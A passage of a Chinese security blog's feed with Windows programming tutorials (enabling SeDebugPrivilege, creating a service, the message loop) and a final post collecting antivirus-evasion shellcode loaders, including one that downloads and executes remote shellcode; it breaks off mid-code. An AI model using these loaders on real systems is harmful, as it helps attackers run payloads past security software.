class="line">std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tp.PrivilegeCount &#x3D; 1;</span><br><span class="line">tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;</span><br><span class="line">if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;Luid)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;LookupPrivilegeValue ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">tp.Privileges[0].Luid &#x3D; Luid;</span><br><span class="line">if (!AdjustTokenPrivileges(Token, FALSE, &amp;tp, sizeof(tp), NULL, NULL) )&#123;</span><br><span class="line">std::cout &lt;&lt; &quot;AdjustTokenPrivileges ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">if (GetLastError() &#x3D;&#x3D; ERROR_NOT_ALL_ASSIGNED) &#123;  &#x2F;&#x2F;ERROR_NOT_ALL_ASSIGNED的出现原因是，用户权限本身就没有sedebugprivilege</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果觉得我的文章对您有用，请随意打赏。您的支持将</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;有很多工具需要启用SeDebugPrivilege才能正常使用，比如mimikatz就有个很经典的 privilege::debug.如果没有这个权限，administrator用openprocess可能都会报错，所以需要提升，管理员组拥有该权限但默认禁用，普通用户不拥有</summary>
      
    
    
    
    
    <category term="windows相关" scheme="http://const27.com/tags/windows%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>windows创建一个服务</title>
    <link href="http://const27.com/2021/02/19/%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1/"/>
    <id>http://const27.com/2021/02/19/%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1/</id>
    <published>2021-02-19T09:22:00.334Z</published>
    <updated>2021-02-19T08:47:29.576Z</updated>
    
    <content type="html"><![CDATA[<h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p>Windows服务，是指运行在windows nt操作系统后台的计算机程序.<br>Windows服务必须符合服务控制管理器的接口规则和协议（SCM)</p><h2 id="如何创建一个Windows服务"><a href="#如何创建一个Windows服务" class="headerlink" title="如何创建一个Windows服务"></a>如何创建一个Windows服务</h2><p>分为：<br>1.完成服务程序主函数（进程入口点（Main函数<br>2.完成服务程序内容主函数（ServiceMain<br>3.服务的注册器和卸载器</p><h3 id="服务程序主函数"><a href="#服务程序主函数" class="headerlink" title="服务程序主函数"></a>服务程序主函数</h3><p>这个阶段，主要干两件事：<br>1.设定好SERVICE_TABLE_ENTRY 结构变量，传入服务名和服务主函数<br>2.调用StartServiceCtrlDispatcher函数<br>以下是SERVICE_TABLE_ENTRY结构</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _SERVICE_TABLE_ENTRYW &#123;</span><br><span class="line">    LPWSTR                      lpServiceName;</span><br><span class="line">    LPSERVICE_MAIN_FUNCTIONW    lpServiceProc;</span><br><span class="line">&#125;SERVICE_TABLE_ENTRYW, *LPSERVICE_TABLE_ENTRYW;</span><br></pre></td></tr></table></figure><p>所以我们的服务程序的主函数只需要像这样写即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">SERVICE_TABLE_ENTRY Table[] &#x3D; &#123; &#123;L&quot;servicename&quot;,ServiceMain&#125;,&#123;NULL,NULL&#125; &#125;;</span><br><span class="line">StartServiceCtrlDispatcher(Table);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在SERVICE_TABLE_ENTRY里我们定义好了一个服务的名字以及其入口函数，然后使用StartServiceCtrlDispatcher去调用这个结构。<br>第一步就是这么简单，接下来让我们去实现服务的入口函数</p><h3 id="完成服务程序内容主函数"><a href="#完成服务程序内容主函数" class="headerlink" title="完成服务程序内容主函数"></a>完成服务程序内容主函数</h3><p>这一步主要要干这几个事情:<br>1.创建服务内容主函数<br>2在服务内容主函数里实现 <code>SERVICE_STATUS</code> 结构的填充，用于与SCM交流<br>3.实现服务句柄，并根据有服务句柄改变状态信息，从而实现SCM发来的控制请求<br>4.逻辑</p><h4 id="创建服务内容主函数"><a href="#创建服务内容主函数" class="headerlink" title="创建服务内容主函数"></a>创建服务内容主函数</h4><p>根据我们在 SERVICE_TABLE_ENTRY 结构中定义的服务入口函数，创建对应函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void WINAPI Servicename(DWORD argc, LPTSTR* argv)</span><br></pre></td></tr></table></figure><h4 id="实现-SERVICE-STATUS-结构"><a href="#实现-SERVICE-STATUS-结构" class="headerlink" title="实现 SERVICE_STATUS 结构"></a>实现 <code>SERVICE_STATUS</code> 结构</h4><p><code>SERVICE_STATUS</code> 结构定义如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _SERVICE_STATUS &#123;</span><br><span class="line">  DWORD dwServiceType;</span><br><span class="line">  DWORD dwCurrentState;</span><br><span class="line">  DWORD dwControlsAccepted;</span><br><span class="line">  DWORD dwWin32ExitCode;</span><br><span class="line">  DWORD dwServiceSpecificExitCode;</span><br><span class="line">  DWORD dwCheckPoint;</span><br><span class="line">  DWORD dwWaitHint;</span><br><span class="line">&#125; SERVICE_STATUS, *LPSERVICE_STATUS;</span><br></pre></td></tr></table></figure><p>每个项都对应了参数…太多了，建议去官方文档对照<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/ns-winsvc-service_status">https://docs.microsoft.com/en-us/windows/win32/api/winsvc/ns-winsvc-service_status</a></p><p>dwservicetype 指定了服务的类型<br>dwCurrentState 指定服务当前的状态（挂起，暂停，启动，停止…)<br>dwControlsAccepted 指定了服务句柄可以接受的参数<br>dwWin32ExitCode 服务用于报告错误的错误代码<br>dwServiceSpecificExitCode 服务特定的错误代码<br>dwCheckPoint 不太懂<br>dwWaitHint 挂起的 启动，停止，暂停或继续操作所需的估计时间，以毫秒为单位 。若指定时间已过去而dwCheckPoint未增加或者dwCurrentState尚未更改，则中止服务。</p><p>总而言之，就是创建一个结构用于收集服务的各个信息</p><h4 id="实现服务句柄-amp-改变状态信息"><a href="#实现服务句柄-amp-改变状态信息" class="headerlink" title="实现服务句柄&amp;改变状态信息"></a>实现服务句柄&amp;改变状态信息</h4><p>实现服务句柄主要是依靠RegisterServiceCtrlHandlerA函数实现的。<br>这个函数的作用是注册一个函数来处理指定服务控制请求。</p><p>这个函数的结构是这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerA(</span><br><span class="line">  LPCSTR             lpServiceName,</span><br><span class="line">  LPHANDLER_FUNCTION lpHandlerProc</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>lpservicename是指定服务名,lphandlerproc是被注册的函数。所以我们要使用这个函数来注册另一个函数，首先要完成被注册函数的内部逻辑。这里做个范例</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void WINAPI ctrl(DWORD Opcode)  &#x2F;&#x2F;定义式固定</span><br><span class="line">&#123;</span><br><span class="line">switch (Opcode)</span><br><span class="line">&#123;</span><br><span class="line">case SERVICE_CONTROL_PAUSE:</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_PAUSED;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_CONTINUE:</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_STOP:</span><br><span class="line">m_ServiceStatus.dwWin32ExitCode &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_STOPPED;</span><br><span class="line">m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line"></span><br><span class="line">SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);</span><br><span class="line">bRunning &#x3D; false;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_INTERROGATE:</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现这个函数会根据传入的值改变 <code>SERVICE_STATUS</code> 结构。<br>若把他注册，那么从服务管理控制器发来的控制指令会被当作参数传入该函数，然后该函数会修改 <code>SERVICE_STATUS</code> 。</p><p>那么改变状态信息的函数主要就是SetServiceStatus 了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL SetServiceStatus(</span><br><span class="line">  SERVICE_STATUS_HANDLE hServiceStatus,</span><br><span class="line">  LPSERVICE_STATUS      lpServiceStatus</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hservicestatus 指向服务句柄 lpservicestatus 指向 <code>SERVICE_STATUS</code> 结构。<br>完成这个函数后，服务就会向服务控制管理器发送自己最新的状态信息（即 <code>SERVICE_STATUS</code> 里定义的东西）。</p><h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">SERVICE_STATUS m_ServiceStatus;</span><br><span class="line">SERVICE_STATUS_HANDLE m_ServiceStatusHandle;</span><br><span class="line">BOOL bRunning;</span><br><span class="line">int main() &#123;</span><br><span class="line">WCHAR Servicename[] &#x3D; L&quot;ServiceA&quot;;</span><br><span class="line">SERVICE_TABLE_ENTRY Table[] &#x3D; &#123; &#123;Servicename,ServiceMain&#125;,&#123;NULL,NULL&#125; &#125;;</span><br><span class="line">StartServiceCtrlDispatcher(Table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m_ServiceStatus.dwServiceType &#x3D; SERVICE_WIN32_OWN_PROCESS;</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_START_PENDING;</span><br><span class="line">m_ServiceStatus.dwControlsAccepted &#x3D; SERVICE_ACCEPT_STOP;</span><br><span class="line">m_ServiceStatus.dwWin32ExitCode &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwServiceSpecificExitCode &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line"></span><br><span class="line">m_ServiceStatusHandle &#x3D; RegisterServiceCtrlHandler(L&quot;ServiceA&quot;, HandlerFunc);</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING;</span><br><span class="line">m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line">SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);</span><br><span class="line">bRunning &#x3D; true;</span><br><span class="line">while (bRunning) &#123;</span><br><span class="line">&#x2F;&#x2F;your code</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void WINAPI HandlerFunc(DWORD code) &#123;</span><br><span class="line">switch (code) &#123;</span><br><span class="line">case SERVICE_CONTROL_PAUSE:</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_PAUSED;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_CONTINUE:</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_STOP:</span><br><span class="line">m_ServiceStatus.dwWin32ExitCode &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_STOPPED;</span><br><span class="line">m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line"></span><br><span class="line">SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);</span><br><span class="line">bRunning &#x3D; false;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_INTERROGATE:</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;服务&quot;&gt;&lt;a href=&quot;#服务&quot; class=&quot;headerlink&quot; title=&quot;服务&quot;&gt;&lt;/a&gt;服务&lt;/h2&gt;&lt;p&gt;Windows服务，是指运行在windows nt操作系统后台的计算机程序.&lt;br&gt;Windows服务必须符合服务控制管理器的接口规则和协议</summary>
      
    
    
    
    
    <category term="windows相关" scheme="http://const27.com/tags/windows%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>windows消息机制</title>
    <link href="http://const27.com/2021/02/19/Windows%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6/"/>
    <id>http://const27.com/2021/02/19/Windows%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6/</id>
    <published>2021-02-19T09:22:00.333Z</published>
    <updated>2021-02-19T08:47:38.878Z</updated>
    
    <content type="html"><![CDATA[<h2 id="事件驱动"><a href="#事件驱动" class="headerlink" title="事件驱动"></a>事件驱动</h2><p>Windows是基于事件驱动的.<br>一般来讲， 服务器处理模型有三种:<br>1每收到一个请求，创建一个新的进程，来处理该请求；<br>2每收到一个请求，创建一个新的线程，来处理该请求；<br>3每收到一个请求，放入一个事件列表，让主进程通过非阻塞I/O方式来处理请求</p><p>1 开销较大:每处理一个事件就要新建一个进程，开销太大，但是实现起来很简单<br>2 死锁问题:多线程调节容易遇到死锁问题，程序直接卡死<br>3 逻辑复杂</p><p>那么事件驱动的优势在哪里呢。<br>打个比方，我们要获取一个鼠标点击的动作。<br>如果我们通过创建线程或者进程的方法，去循环扫描当前是否有鼠标点击事件那么可能会造成资源浪费（鼠标一直不点击，但仍在进行扫描），响应缓慢（扫描的设备有很多，会造成响应缓慢的问题）等问题。<br>但是事件驱动就不一样了，它的核心原理是以消息队列为核心，当捕获到一个事件（如鼠标点击）时把他放进消息队列，然后当该事件从队列中被取出时，根据事件类型调用不同的函数来进行处理,其中每个事件一般都各自保存各自的处理函数指针，这样，每个消息都有独立的处理函数 。</p><h2 id="消息机制"><a href="#消息机制" class="headerlink" title="消息机制"></a>消息机制</h2><p>事件驱动在Windows下的具象化就是消息机制。<br>事件队列对应过来就是消息队列.</p><p>它会为每一个应用程序新开一个对应的消息队列，用于捕获其消息。</p><p>我们以一个简单的窗口实现来看看消息机制。 注意下方注释处即可。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hPrevInStance, LPSTR lpCmdLine, int nShowCmd) &#123;</span><br><span class="line"></span><br><span class="line">static TCHAR szAppName[] &#x3D; TEXT(&quot;窗口类名称&quot;);</span><br><span class="line">HWND         hwnd;</span><br><span class="line">MSG          msg;</span><br><span class="line">WNDCLASSEX   wndclass &#x3D; &#123; 0 &#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;设计窗口类</span><br><span class="line">wndclass.cbSize &#x3D; sizeof(WNDCLASSEX);</span><br><span class="line">wndclass.style &#x3D; CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">wndclass.lpfnWndProc &#x3D; WndProc;</span><br><span class="line">wndclass.cbClsExtra &#x3D; 0;</span><br><span class="line">wndclass.cbWndExtra &#x3D; 0;</span><br><span class="line">wndclass.hInstance &#x3D; hinstance;</span><br><span class="line">wndclass.hIcon &#x3D; LoadIcon(NULL, IDI_APPLICATION);</span><br><span class="line">wndclass.hCursor &#x3D; LoadCursor(NULL, IDC_ARROW);</span><br><span class="line">wndclass.hbrBackground &#x3D; (HBRUSH)GetStockObject(BLACK_BRUSH);</span><br><span class="line">wndclass.lpszMenuName &#x3D; NULL;</span><br><span class="line">wndclass.lpszClassName &#x3D; szAppName;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (!RegisterClassEx(&amp;wndclass))</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(NULL, TEXT(&quot;RegisterClassEx failed!&quot;),TEXT(&quot;title&quot;), MB_ICONERROR);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hwnd &#x3D; CreateWindowEx(WS_EX_OVERLAPPEDWINDOW,</span><br><span class="line">szAppName,</span><br><span class="line">TEXT(&quot;窗口名称&quot;),</span><br><span class="line">WS_OVERLAPPEDWINDOW,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">CW_USEDEFAULT,</span><br><span class="line">NULL,</span><br><span class="line">NULL,</span><br><span class="line">hinstance,</span><br><span class="line">NULL);</span><br><span class="line"></span><br><span class="line">ShowWindow(hwnd, nShowCmd);</span><br><span class="line">UpdateWindow(hwnd);</span><br><span class="line"></span><br><span class="line">while (GetMessage(&amp;msg, hwnd, 0, 0)) &#123;  #从消息队列中获取消息，若存在消息待处理，则进行窗口过程。同时通过句柄得到需要捕捉消息的应用程序。</span><br><span class="line">TranslateMessage(&amp;msg);</span><br><span class="line">DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line">return msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line">LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) &#123;</span><br><span class="line">HDC hdc;</span><br><span class="line">PAINTSTRUCT ps;</span><br><span class="line">RECT rect;</span><br><span class="line"></span><br><span class="line">switch (message)</span><br><span class="line">&#123;</span><br><span class="line">case WM_PAINT:</span><br><span class="line">hdc &#x3D; BeginPaint(hwnd, &amp;ps);</span><br><span class="line">GetClientRect(hwnd, &amp;rect);</span><br><span class="line">DrawText(hdc, TEXT(&quot;FUCK&quot;), -1, &amp;rect, DT_CENTER);</span><br><span class="line">EndPaint(hwnd, &amp;ps);</span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">case WM_LBUTTONUP:</span><br><span class="line">MessageBox(NULL, TEXT(&quot;老子被点了&quot;), TEXT(&quot;tick&quot;), 0);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于消息机制，有几个点需要特别关注。</p><p>1.WM_PAINT,WM_TIMER,WM_QUIT 这几个消息永远被放在消息队列最后。<br>究其原因很简单，就拿WM_QUIT举例，他是意思是退出，若不放在最后，WM_QUIT后面的消息也就无法处理了。<br>2.也有部分消息是非队列消息，可以无视队列顺序首先被处理。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;事件驱动&quot;&gt;&lt;a href=&quot;#事件驱动&quot; class=&quot;headerlink&quot; title=&quot;事件驱动&quot;&gt;&lt;/a&gt;事件驱动&lt;/h2&gt;&lt;p&gt;Windows是基于事件驱动的.&lt;br&gt;一般来讲， 服务器处理模型有三种:&lt;br&gt;1每收到一个请求，创建一个新的进程，来处理</summary>
      
    
    
    
    
    <category term="windows相关" scheme="http://const27.com/tags/windows%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>DefenseEvasion收集</title>
    <link href="http://const27.com/2021/02/19/Defense%20Evasion%20%E6%94%B6%E9%9B%86/"/>
    <id>http://const27.com/2021/02/19/Defense%20Evasion%20%E6%94%B6%E9%9B%86/</id>
    <published>2021-02-19T09:21:55.788Z</published>
    <updated>2021-02-19T08:51:07.532Z</updated>
    
    <content type="html"><![CDATA[<p>前面的话:”免杀一般都是靠组合拳”</p><h2 id="EXE"><a href="#EXE" class="headerlink" title="EXE"></a>EXE</h2><h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h3><p>没什么好说的。可以自写加壳器等等</p><h3 id="添加数字签名"><a href="#添加数字签名" class="headerlink" title="添加数字签名"></a>添加数字签名</h3><p>不同的杀软对数字签名的敏感性不同，有些杀软可能只检查一下有没有数字签名就过了，有些杀软可能要去验证一下数字签名的正确性，有些可能管都不管数字签名。只能说添加数字签名能稍微提升一下exe的免杀几率。</p><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><h3 id="指针执行-申请内存动态加载shellcode"><a href="#指针执行-申请内存动态加载shellcode" class="headerlink" title="指针执行+申请内存动态加载shellcode"></a>指针执行+申请内存动态加载shellcode</h3><p>首先从cobalt strike上生成拿到shellcode用作本次测试。<br>然后通过下面的代码，直接执行写死在程序里的shellcode。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">    void* exec &#x3D; VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memcpy(exec, buf, sizeof buf);</span><br><span class="line">    ((void(*)())exec)();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145713.png" alt="QQ截图20210217145713"></p><p>可以看见，还是很拉跨的。</p><h3 id="内联汇编加载shellcode"><a href="#内联汇编加载shellcode" class="headerlink" title="内联汇编加载shellcode"></a>内联汇编加载shellcode</h3><p>c++有强大的内联汇编功能，上次写壳的时候就感受了一番。<br>我们可以通过内联汇编代码加载shellcode.顺便加花什么的，都可以弄。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;winhttp.h&gt;</span><br><span class="line">#pragma comment(lib, &quot;winhttp.lib&quot;)</span><br><span class="line">#pragma comment(lib,&quot;user32.lib&quot;)</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">_asm &#123;</span><br><span class="line">lea eax, buf;</span><br><span class="line">jmp eax;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145723.png" alt="QQ截图20210217145723"></p><p>还是蛮拉跨的，虽然我没有加花。</p><h3 id="HTTP协议远程读取shellcode"><a href="#HTTP协议远程读取shellcode" class="headerlink" title="HTTP协议远程读取shellcode"></a>HTTP协议远程读取shellcode</h3><p>这次我们不把shellcode写死在程序之中，而是通过程序发起http请求向外界获得shellcode并执行。<br>这里涉及到winhttp.h的一些函数的使用。</p><p>源码借用一下 卿 的代码。它的代码是直接把shellcode的十六进制以字符串形式直接放到远程服务器上。像这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145737.png" alt="QQ截图20210217145737"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;winhttp.h&gt;</span><br><span class="line">#pragma comment(lib,&quot;winhttp.lib&quot;)</span><br><span class="line">#pragma comment(lib,&quot;user32.lib&quot;)</span><br><span class="line">using namespace std;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwSize &#x3D; 0;</span><br><span class="line">    DWORD dwDownloaded &#x3D; 0;</span><br><span class="line">    LPSTR pszOutBuffer &#x3D; NULL;</span><br><span class="line">    HINTERNET  hSession &#x3D; NULL,</span><br><span class="line">        hConnect &#x3D; NULL,</span><br><span class="line">        hRequest &#x3D; NULL;</span><br><span class="line">    BOOL  bResults &#x3D; FALSE;</span><br><span class="line">    hSession &#x3D; WinHttpOpen(L&quot;User-Agent&quot;, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);</span><br><span class="line">    if (hSession)</span><br><span class="line">    &#123;</span><br><span class="line">        hConnect &#x3D; WinHttpConnect(hSession, L&quot;127.0.0.1&quot;, INTERNET_DEFAULT_HTTP_PORT, 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (hConnect)</span><br><span class="line">    &#123;</span><br><span class="line">        hRequest &#x3D; WinHttpOpenRequest(hConnect, L&quot;POST&quot;, L&quot;qing.txt&quot;, L&quot;HTTP&#x2F;1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    LPCWSTR header &#x3D; L&quot;Content-type: application&#x2F;x-www-form-urlencoded&#x2F;r&#x2F;n&quot;;</span><br><span class="line">    SIZE_T len &#x3D; lstrlenW(header);</span><br><span class="line">    WinHttpAddRequestHeaders(hRequest, header, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);</span><br><span class="line">    if (hRequest)</span><br><span class="line">    &#123;</span><br><span class="line">        std::string data &#x3D; &quot;name&#x3D;host&amp;sign&#x3D;xx11sad&quot;;</span><br><span class="line">        const void *ss &#x3D; (const char *)data.c_str();</span><br><span class="line">        bResults &#x3D; WinHttpSendRequest(hRequest, 0, 0, const_cast&lt;void *&gt;(ss), data.length(), data.length(), 0);</span><br><span class="line">        &#x2F;&#x2F;&#x2F;&#x2F;bResults&#x3D;WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS, 0,WINHTTP_NO_REQUEST_DATA, 0, 0, 0 );</span><br><span class="line">    &#125;</span><br><span class="line">    if (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        bResults &#x3D; WinHttpReceiveResponse(hRequest, NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    if (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; Check for available data.</span><br><span class="line">            dwSize &#x3D; 0;</span><br><span class="line">            if (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;Error %u in WinHttpQueryDataAvailable.\n&quot;, GetLastError());</span><br><span class="line"></span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (!dwSize)</span><br><span class="line">                break;</span><br><span class="line"></span><br><span class="line">            pszOutBuffer &#x3D; new char[dwSize + 1];</span><br><span class="line"></span><br><span class="line">            if (!pszOutBuffer)</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;Out of memory\n&quot;);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ZeroMemory(pszOutBuffer, dwSize + 1);</span><br><span class="line"></span><br><span class="line">            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded))</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;Error %u in WinHttpReadData.\n&quot;, GetLastError());</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;ok&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F;char ShellCode[1024];</span><br><span class="line">            int code_length &#x3D; strlen(pszOutBuffer);</span><br><span class="line">            char* ShellCode &#x3D; (char*)calloc(code_length  &#x2F;2 , sizeof(unsigned char));</span><br><span class="line"></span><br><span class="line">            for (size_t count &#x3D; 0; count &lt; code_length &#x2F; 2; count++)&#123;</span><br><span class="line">                sscanf(pszOutBuffer, &quot;%2hhx&quot;, &amp;ShellCode[count]);</span><br><span class="line">                pszOutBuffer +&#x3D; 2;</span><br><span class="line">            &#125;</span><br><span class="line">            printf(&quot;%s&quot;, ShellCode);</span><br><span class="line">            &#x2F;&#x2F;strcpy(ShellCode,pszOutBuffer);</span><br><span class="line">            void *exec &#x3D; VirtualAlloc(0, sizeof ShellCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            memcpy(exec, ShellCode, sizeof ShellCode);</span><br><span class="line">            ((void(*)())exec)();</span><br><span class="line">            delete[] pszOutBuffer;</span><br><span class="line">            if (!dwDownloaded)</span><br><span class="line">                break;</span><br><span class="line">        &#125; while (dwSize &gt; 0);</span><br><span class="line">    &#125;</span><br><span class="line">    if (hRequest) WinHttpCloseHandle(hRequest);</span><br><span class="line">    if (hConnect) WinHttpCloseHandle(hConnect);</span><br><span class="line">    if (hSession) WinHttpCloseHandle(hSession);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span 